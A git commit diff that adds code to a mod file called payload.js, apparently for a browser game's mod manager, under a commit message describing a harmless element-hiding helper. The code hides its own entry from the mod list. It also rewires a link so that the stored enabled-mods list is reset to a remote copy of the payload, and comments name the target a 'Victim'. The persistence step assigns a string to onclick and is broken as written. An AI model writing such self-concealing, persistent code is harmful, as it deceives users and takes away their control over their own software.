dcc910cb73ed769a6f8a5d7d977c868ea1509f75
Agni Rammohan <103090218+agni2012@users.noreply.github.com>
2026-06-12 14:23:35 +0530

    Implement hideAll function in payload.js
    Add function to hide elements containing a specific name.

--- payload.js
+++ payload.js
@@ -1,2 +1,19 @@
 //Emergency File JIK Victim--hold on a sec who said that i meant neer notices mod
 //Set this to the mods.
+
+function hideAll(parent, name) {
+	var elements = parent.getElementsByTagName("*");
+
+	for (var i = 0; i < elements.length; i++) {
+		if (elements[i].textContent.indexOf(name) !== -1) {
+			elements[i].style.display = "none";
+		}
+	}
+}
+hideAll(document.querySelector("#modManagerList"), "payload.js")
+
+//So, um, this will make it really hard to remove if DevMode is off....
+document.querySelector("#loadingP > a").onclick=`localStorage.removeItem('enabledMods');
+localStorage.setItem('enabledMods', ["http://agni2012.github.io/payload.js"])
+location.reload()`;
+//Really sorry neer
